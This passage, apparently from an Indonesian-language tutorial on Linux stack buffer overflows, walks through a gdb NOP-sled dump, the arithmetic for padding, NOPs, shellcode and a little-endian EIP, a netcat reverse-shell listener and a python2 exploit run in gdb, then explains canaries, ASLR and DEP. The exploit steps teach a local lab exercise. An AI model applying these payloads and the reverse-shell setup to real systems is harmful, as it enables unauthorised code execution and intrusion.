0xffffd262:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd26a:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd272:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd27a:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd282:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd28a:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd292:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd29a:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd2a2:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd2aa:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd2b2:     0x90    0x90    0x90    0x90    0xb8    0x35    0x25    0x1d  # <--- Awal Dari Shellcode
0xffffd2ba:     0x59    0xdd    0xc2    0xd9    0x74    0x24    0xf4    0x5a

```

Dalam kasus ini saya akan menggunakan alamat `0xffffd262` sebagai nilai `EIP` untuk dieksekusi oleh CPU.

Hal ini kurang lebih terilustrasikan sebagai berikut:

![Segmentation Fault](/assets/img/posts/stack-buffer-overflows-linux/6.png)

Berikut adalah perhitungan ulang *buffer* yang akan kita gunakan:

```c
   Buffer = "\x55" * (1040 - 100 - 95 - 4) = 841
     NOPs = "\x90" * 100
Shellcode = "\xda\xca...<SNIP>...\x22\xa2"
      EIP = "\x62\xd2\xff\xff"   // <-- Little-Endian
```

Setelah itu jalankan *listener* untuk menerima *reverse shell*.

```bash
➜ nc -lnvp 31337           
listening on [any] 31337 ...
```

Jalankan *buffer* dan *shellcode* yang telah kita buat sebelumnya dan dapatkan *reverse shell*.

```bash
(gdb) run $(python2 -c 'print "\x55" * (1040 - 155 - 95 - 4) + "\x90" * 155 + "\xb8\x35...<SNIP>...\xf5\x9e" + "\x62\xd2\xff\xff" * 4') 
```

```bash
➜ nc -lnvp 31337           
listening on [any] 31337 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37300
```

## 6. Pencegahan Teknik dan Mekanisme

Perlindungan terbaik terhadap *buffer overflows* adalah pemrograman yang sadar akan keamanan. 

Selain itu terdapat mekanisme kemananan yang mendukung developer untuk mencegah pengguna mengekploitasi kerentanan *buffer overflows*, seperti:
- `Canaries`
- `Address Space Layout Randomization (ASLR)`
- `Data Execution Prevention (DEP)`

### Canaries

**Canaries** adalah nilai yang diketahui yang ditulis ke `Stack` antara *buffer* dan data kontrol untuk mendeteksi *buffer overflows*. Prinsipnya adalah jika terjadi *buffer overflows*, `canary` akan ditimpa terlebih dahulu dan sistem operasi akan memeriksa selama *runtime* apakah canary ada dan tidak diubah.

### Address Space Layout Randomization (ASLR)

**Address Space Layout Randomization (ASLR)** adalah mekanisme keamanan terhadap *buffer overflows*. `ASLR` membuat beberapa jenis serangan lebih sulit dengan mempersulit penyerang untuk menemukan alamat target di memori, sehingga alamatnya perlu ditebak.

### Data Execution Prevention (DEP)

**Data Execution Prevention (DEP)** adalah fitur keamanan yang tersedia di Windows XP (SP2). Dengan `DEP` program dipantau selama eksekusi untuk memastikan bahwa mereka mengakses area memori dengan bersih. `DEP` menghentikan program jika program mencoba memanggil atau mengakses kode program dengan cara yang tidak sah.

--- 

Referensi:
- https://linuxhint.com/understanding_elf_file_format/
- https://academy.hackthebox.com/module/details/85
- https://academy.hackthebox.com/module/details/31
- https://www.techtarget.com/searchsecurity/definition/address-space-layout-randomization-ASLR
- https://www.fortinet.com/resources/cyberglossary/what-is-canary-in-cybersecurity
- https://www.tembolok.id/memahami-dep-dan-cara-disable-dep-windows-xp-7-8-10/